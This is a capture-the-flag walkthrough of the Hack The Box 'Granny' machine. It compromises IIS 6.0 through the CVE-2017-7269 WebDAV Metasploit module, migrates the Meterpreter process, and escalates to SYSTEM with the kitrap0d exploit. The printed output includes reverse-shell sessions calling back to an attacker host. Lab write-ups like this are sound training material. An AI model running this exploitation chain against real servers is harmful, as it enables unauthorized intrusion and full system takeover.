# Granny

> A medium-difficulty Windows machine from Hack The Box focused on IIS 6.0, WebDAV exploitation, Meterpreter post-exploitation, and Windows privilege escalation.

---

## Overview

| Category                 | Details                            |
| ------------------------ | ---------------------------------- |
| **Machine**              | Granny                             |
| **Platform**             | Windows                            |
| **Difficulty**           | Medium                             |
| **Target IP**            | `10.129.95.234`                    |
| **Primary Service**      | Microsoft IIS 6.0                  |
| **WebDAV**               | Enabled                            |
| **Initial Access**       | IIS 6.0 WebDAV exploitation        |
| **Initial Context**      | Meterpreter session                |
| **Privilege Escalation** | Windows local privilege escalation |
| **Final Access**         | `NT AUTHORITY\SYSTEM`              |

### Attack Path

```text
┌──────────────────────────────┐
│        Port Enumeration      │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       IIS 6.0 + WebDAV       │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│    CVE-2017-7269 Identified  │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Meterpreter Session     │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│     Local Exploit Suggester  │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       Process Migration      │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│       Local PrivEsc          │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      NT AUTHORITY\SYSTEM     │
└──────────────────────────────┘
```

---

# 1. Enumeration

## 1.1 Initial Nmap Scan

We started with a basic Nmap scan against the target:

```bash
nmap 10.129.95.234
```

The scan returned only one open port:

```text
Nmap scan report for 10.129.95.234
Host is up, received echo-reply ttl 127 (0.26s latency).
Scanned at 2026-09-05 00:53:45 EDT for 18s
Not shown: 999 filtered tcp ports (no-response)

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
```

At this point, **TCP/80** was the only visible service.

|     Port | State | Service |
| -------: | ----- | ------- |
| `80/tcp` | Open  | HTTP    |

The full port scan was allowed to continue in the background while we moved on to service enumeration.

---

## 1.2 Service and Version Detection

We performed service and version detection against the target:

```bash
nmap -sC -sV 10.129.95.234
```

The scan identified **Microsoft IIS 6.0**:

```text
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-webdav-scan:
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Sat, 05 Sep 2026 05:04:45 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  WebDAV type: Unknown
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
| http-ntlm-info:
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Key Findings

| Finding         | Result               |
| --------------- | -------------------- |
| Web Server      | Microsoft IIS 6.0    |
| WebDAV          | Enabled              |
| HTTP Title      | `Under Construction` |
| Target Name     | `GRANNY`             |
| Product Version | `5.2.3790`           |
| OS              | Windows              |

The large number of enabled WebDAV methods was particularly interesting because WebDAV is part of IIS's attack surface.

---

# 2. Web Enumeration

## 2.1 Directory and File Fuzzing

We used **Feroxbuster** to perform directory and file enumeration.

The scan discovered several IIS-related paths:

```text
http://10.129.95.234/
http://10.129.95.234/%5Fprivate/
http://10.129.95.234/%5Fvti%5Flog/
http://10.129.95.234/%5Fvti%5Fbin/
http://10.129.95.234/aspnet%5Fclient/
http://10.129.95.234/images/
http://10.129.95.234/Images/
```

One of the discovered paths indicated a directory listing:

```text
http://10.129.95.234/%5Fvti%5Fbin/
```

However, the directory enumeration did not reveal anything immediately useful for obtaining access.

---

# 3. Initial Foothold

## 3.1 Identifying the IIS Vulnerability

The IIS version and WebDAV configuration immediately suggested investigating known vulnerabilities affecting **IIS 6.0**.

We searched Metasploit for **CVE-2017-7269**:

```text
search CVE-2017-7269
```

Metasploit returned:

```text
Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
```

The available module was:

```text
exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

We used the module against the target and executed it.

---

## 3.2 Obtaining a Meterpreter Session

The exploit successfully created a Meterpreter session:

```text
[*] Started reverse TCP handler on 10.10.15.95:4444
[*] Trying path length 3 to 60 ...
[*] Sending stage (190534 bytes) to 10.129.95.234
[*] Meterpreter session 1 opened (10.10.15.95:4444 -> 10.129.95.234:1030) at 2026-09-05 01:35:53 -0400

(Meterpreter 1)(c:\windows\system32\inetsrv) >
```

We had successfully obtained our initial Meterpreter session.

However, attempts to retrieve the session identity and system information failed:

```text
getuid
```

Returned:

```text
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

Similarly:

```text
sysinfo
```

Returned:

```text
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

This indicated that the current session required further post-exploitation work.

---

# 4. Privilege Escalation

## 4.1 Local Exploit Suggester

We used Metasploit's Local Exploit Suggester to identify potential privilege escalation vectors.

```text
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

The module identified several potential vulnerabilities:

```text
1   exploit/windows/local/ms10_015_kitrap0d
    The service is running, but could not be validated.

2   exploit/windows/local/ms14_058_track_popup_menu
    The target appears to be vulnerable.

3   exploit/windows/local/ms14_070_tcpip_ioctl
    The target appears to be vulnerable.

4   exploit/windows/local/ms15_051_client_copy_image
    The target appears to be vulnerable.

5   exploit/windows/local/ms16_016_webdav
    The service is running, but could not be validated.

6   exploit/windows/local/ppr_flatten_rec
    The target appears to be vulnerable.
```

Several possible local privilege escalation vectors were therefore available.

Before attempting them, we needed a session with the appropriate process context.

---

## 4.2 Process Enumeration

We examined the running processes and identified the following:

```text
404   344   lsass.exe
944   392   spoolsv.exe
1912  584   wmiprvse.exe       x86   0   NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
```

We first attempted to migrate into `lsass.exe`:

```text
migrate 404
```

The migration failed:

```text
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
```

We then tried `spoolsv.exe`:

```text
migrate 944
```

This also failed:

```text
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
```

Finally, we attempted to migrate into `wmiprvse.exe`:

```text
migrate 1912
```

This migration succeeded:

```text
[*] Migrating from 1728 to 1912...
[*] Migration completed successfully.
(Meterpreter 1)(C:\WINDOWS\system32) >
```

We verified the new context:

```text
getuid
```

The result was:

```text
Server username: NT AUTHORITY\NETWORK SERVICE
```

Our Meterpreter session was now running as:

```text
NT AUTHORITY\NETWORK SERVICE
```

---

# 5. SYSTEM-Level Access

## 5.1 Exploiting the Local Privilege Escalation

With the session migrated into `wmiprvse.exe`, we returned to the privilege escalation options identified earlier.

We selected:

```text
exploit/windows/local/ms10_015_kitrap0d
```

The exploit was executed against the Meterpreter session.

Metasploit returned:

```text
Started reverse TCP handler on 10.10.15.95:5555
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 2948 launched.
[*] Reflectively injecting the DLL into 2948...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (190534 bytes) to 10.129.95.234
[*] Meterpreter session 2 opened (10.10.15.95:5555 -> 10.129.95.234:1031) at 2026-09-05 01:42:24 -0400
```

A second Meterpreter session was created.

We verified its privileges:

```text
getuid
```

Output:

```text
Server username: NT AUTHORITY\SYSTEM
```

The privilege escalation was successful, and we now had:

```text
NT AUTHORITY\SYSTEM
```

---

# 6. Flag Retrieval

## 6.1 User Flag

With SYSTEM-level access, we navigated to the `Lakis` user's directory:

```text
cd Lakis\
cd Desktop\
```

The resulting path was:

```text
C:\Documents and Settings\Lakis\Desktop
```

The user flag was retrieved with:

```text
cat user.txt
```

The flag value is intentionally omitted because it was not included in the raw notes.

---

## 6.2 Root Flag

We then accessed the Administrator Desktop and retrieved the root flag:

```text
C:\Documents and Settings\Administrator\Desktop
```

The flag was retrieved with:

```text
cat root.txt
```

Again, the actual flag value is omitted because it was not present in the supplied notes.

---

# 7. Attack Path Summary

```text
                    ┌───────────────────┐
                    │   Target: Granny  │
                    │ 10.129.95.234     │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │   Nmap Scanning   │
                    │      Port 80      │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │   IIS 6.0 +       │
                    │      WebDAV       │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │   CVE-2017-7269   │
                    │   WebDAV Exploit  │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │ Meterpreter       │
                    │   Session 1       │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │ Local Exploit     │
                    │    Suggester      │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │ Process Migration │
                    │   wmiprvse.exe    │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │ NETWORK SERVICE   │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │ Local Privilege   │
                    │    Escalation     │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │      SYSTEM       │
                    └─────────┬─────────┘
                              │
                       ┌──────┴──────┐
                       ▼             ▼
                  user.txt       root.txt
```

---

# 8. Key Takeaways

### 1. Version Enumeration Matters

Identifying **Microsoft IIS 6.0** gave us a clear direction for vulnerability research.

### 2. WebDAV Can Increase the Attack Surface

The server exposed a large number of WebDAV methods. When combined with an outdated IIS version, this became particularly important during enumeration.

### 3. Initial Access Is Only the Beginning

Obtaining a Meterpreter session did not immediately provide complete information or privileges. Further post-exploitation enumeration was required.

### 4. Process Migration Can Be Important

The initial process context prevented migration into privileged processes. However, migrating into `wmiprvse.exe` successfully provided a `NETWORK SERVICE` context suitable for the next step.

### 5. Local Exploit Enumeration Helps Narrow the Attack Surface

The Local Exploit Suggester identified multiple possible privilege escalation vectors, allowing us to investigate the available options rather than blindly testing unrelated exploits.

### 6. Always Verify Privilege Escalation

The final `getuid` check confirmed that the second Meterpreter session had successfully reached:

```text
NT AUTHORITY\SYSTEM
```

---

# 9. Tools Used

* **Nmap** — Port and service enumeration
* **Feroxbuster** — Directory and file enumeration
* **Metasploit Framework** — Exploitation and privilege escalation
* **Meterpreter** — Post-exploitation and process migration
* **Netcat / Reverse TCP Handler** — Session connectivity through Metasploit

---

# 10. Conclusion

Granny was a valuable Windows penetration-testing exercise that demonstrated how an outdated web server and exposed WebDAV functionality can provide an initial entry point into a target.

The machine then shifted the focus toward Windows post-exploitation, where process enumeration, migration, and local vulnerability assessment were necessary before achieving SYSTEM-level access.

The biggest lesson from Granny is the importance of following a **structured methodology**: enumerate the exposed services, identify the underlying technology, research the attack surface, obtain the initial foothold, enumerate the compromised environment, and systematically work toward higher privileges.
